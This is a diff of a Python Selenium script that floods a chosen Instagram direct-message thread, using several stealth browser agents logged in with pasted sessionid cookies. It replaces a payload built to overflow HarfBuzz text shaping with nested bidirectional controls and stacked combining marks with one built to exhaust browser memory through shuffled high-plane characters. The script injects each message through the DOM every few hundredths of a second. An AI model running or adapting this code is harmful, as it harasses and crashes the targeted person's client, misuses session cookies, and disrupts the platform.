@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (SHAPING-NUCLEAR V79)
-# 📅 STATUS: HARFBUZZ-BUFFER-OVERFLOW | 4-AGENT TOTAL | AWS-CPU-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (ENTROPY-STORM V77)
+# 📅 STATUS: RAM-FRAGMENTATION-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -9,40 +9,34 @@ from selenium_stealth import stealth
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 
-# --- ⚡ VELOCITY & NUCLEAR CONFIG ---
+# --- ⚡ VELOCITY & KILL CONFIG ---
 AGENTS_PER_MACHINE = 4             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.05)  # 🔥 ABSOLUTE VELOCITY
-REST_AFTER_STRIKES = 400   
+BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM PACKET VELOCITY
+REST_AFTER_STRIKES = 300   
 REST_DURATION = 1          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_nuclear_shaping_payload():
-    """Generates a payload that hits the HarfBuzz 150-mark buffer limit."""
-    u_id = random.randint(100, 999)
-    
-    # \u2066 = LRI | \u2067 = RLI | \u2068 = FSI (The Tri-Directional Nest)
-    # \u034F = CGJ (Combining Grapheme Joiner)
-    lri, rli, fsi, pdi, cgj = "\u2066", "\u2067", "\u2068", "\u2069", "\u034F"
-    
-    # 150 Stacking marks to overflow the internal shaping buffer
-    marks = "".join([chr(i) for i in range(0x0300, 0x036F)] * 2)[:150] 
+def get_entropy_storm_payload():
+    """Generates unique, high-entropy data to shatter browser memory management."""
+    u_id = random.randint(1000, 9999)
+    # High-plane characters (4 bytes) that force unique memory allocation
+    # 𒀱 = Cuneiform | ﷽ = Wide Ligature | 𒈙 = Complexity
+    heavy_pool = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "🌙", "👑", "𝕻", "𝕬", "𝕰", "𝕽"]
     glue = "\u2060" # Word Joiner
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [NUCLEAR_SHAPE:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STORM_ID:{u_id}]"
     
     body = []
-    # 450 lines - Hitting the absolute 10KB Instagram socket limit
+    # 450 lines of unique, non-compressible memory blocks
     for i in range(450):
-        # We alternate direction for EVERY character within a deep nest.
-        # This prevents 'Fast-Path' rendering and forces a C++ context switch.
-        line = f"{lri}{rli}{fsi}"
-        for char in "PRAVEER":
-            line += f"{char}{marks}{cgj}"
-        line += f"{pdi*3} 👑 {i}{glue*2}"
+        # Shuffling ensures the browser cannot 'intern' the string.
+        # Every message is a fresh 10KB memory allocation.
+        random.shuffle(heavy_pool)
+        line = f"PRAVEER PAPA {''.join(heavy_pool * 5)} {i}{glue*4}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -64,7 +58,7 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Direct DOM injection bypassing the 'Typing' hang priority queue."""
+    """Direct DOM injection that bypasses UI thread priority queues."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
@@ -91,17 +85,17 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(15) 
+            time.sleep(12) 
             
             strike_count = 0
             while True:
-                payload = get_nuclear_shaping_payload()
+                payload = get_entropy_storm_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Nuclear-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Storm-Strike ({GLOBAL_SENT})")
                     
                     if strike_count % 100 == 0:
                         driver.refresh()
